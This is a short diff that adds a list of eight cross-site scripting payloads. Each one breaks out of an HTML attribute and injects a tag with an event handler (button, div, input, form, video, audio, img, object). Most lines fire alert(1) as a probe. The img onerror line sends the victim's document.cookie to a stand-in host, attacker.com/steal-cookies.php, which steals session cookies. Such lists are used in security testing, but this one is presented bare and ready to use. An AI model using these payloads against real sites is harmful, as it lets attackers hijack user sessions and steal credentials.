@@ -1,0 +1,8 @@
+"><button onclick=alert(1)>Click Me</button>
+"><div onmouseover=alert(1)>Hover me</div>
+"><input type=text onfocus=alert(1)>
+"><form onsubmit=alert(1)><input type=submit>
+"><video onplay=alert(1) autoplay>
+"><audio oncanplay=alert(1) src=x>
+"><img src=x onerror=this.src='https://attacker.com/steal-cookies.php?c='+document.cookie>
+"><object data=javascript:alert(1)>
